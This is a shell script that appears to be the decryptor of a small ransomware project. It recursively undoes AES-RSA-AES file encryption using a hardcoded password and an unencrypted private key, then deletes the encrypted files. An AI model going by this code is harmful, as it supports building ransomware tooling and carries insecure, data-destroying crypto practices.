#!/sh

aes_password="ricardo"

dec(){
	input="$1"
	if [ $(stat -c %a $input | cut -c 1) = 6 ]; then
		openssl aes-256-cbc -pass pass:$aes_password -in $input -d -out $input.1
		openssl rsautl -decrypt -inkey /home/deauth/ransom/keys/private_unencrypted.pem -in $input.1 -out $input.2
		openssl aes-256-cbc -pass pass:$aes_password -in $input.2 -d -out $input.3
		mv $input.3 $(echo $input.3 | sed 's/.enc.3//')
		rm $input
		rm $input.1
		rm $input.2
	fi
}

loop(){
for f in $1/*; do
	if [ -d $f ]; then
		echo "$f is a dir"
		loop $f
	else
		#echo "$f is not a dir"
		echo "\n\nFile: $f\n"
	        dec $f
	        echo "\n\n"
	        echo "------------------------"
	fi
done
}

if test "$#" -ne 1; then
	echo "Usage: \n - sh enc.sh $dirname"
	exit 0
fi

loop $1